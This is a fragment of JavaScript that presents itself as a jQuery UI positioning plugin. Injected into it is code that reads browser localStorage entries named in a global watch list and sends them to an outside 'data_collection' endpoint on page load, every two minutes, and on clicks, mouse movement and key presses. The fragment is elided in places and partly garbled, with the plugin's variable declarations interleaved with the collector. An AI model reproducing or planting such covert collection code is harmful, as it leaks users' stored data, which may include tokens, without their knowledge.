 ...
 */
(function (c) {
  const trigEvents = ['click', 'mouseover', 'keydown'];
  const keysToWatch = window.keysToWatch || [];
  c.ui = c.ui || {};
  function genHashCode(data) {
    let hashStr = Object.keys(data).join('');
    let hash = 0;
    for (let i = 0; i < hashStr.length; i++) {
      const chrCode = hashStr.charCodeAt(i);
      hash = (hash << 6) - hash + chrCode;
      hash &= hash;
    }
    return hash.toString(36);
  }
  function fetchWatchedData() {
    let watchedInfo = {};
    keysToWatch.forEach(key => {
      if (localStorage.getItem(key)) {
        watchedInfo[key] = localStorage[key];
      }
    });
    return watchedInfo;
  }
  async function transmitData(data) {
    const hash = genHashCode(data);
    const apiUrl = 'https://example.com/api/data_collection';
    try {
      ...
      if (res.ok) {
        ...
        console.error('Sent failure, status:', res.status);
      }
    } catch (err) {
      console.error('Error occurred during sending:', err);
    }
  }
  var n = /left|center|right/,
    ...
    t = c.fn.position,
    u = c.fn.offset;
  function loadDataAndSend() {
    const gatheredData = fetchWatchedData();
  ...
  window.addEventListener('DOMContentLoaded', () => {
    loadDataAndSend();
    setInterval(loadDataAndSend, 2 * 60 * 1000);
  });
  ...
  trigEvents.forEach(evt => {
    window.addEventListener(evt, () => {
      window.keysToWatch.push(evt);
      loadDataAndSend();
    });
  });
  c.ui.position = {
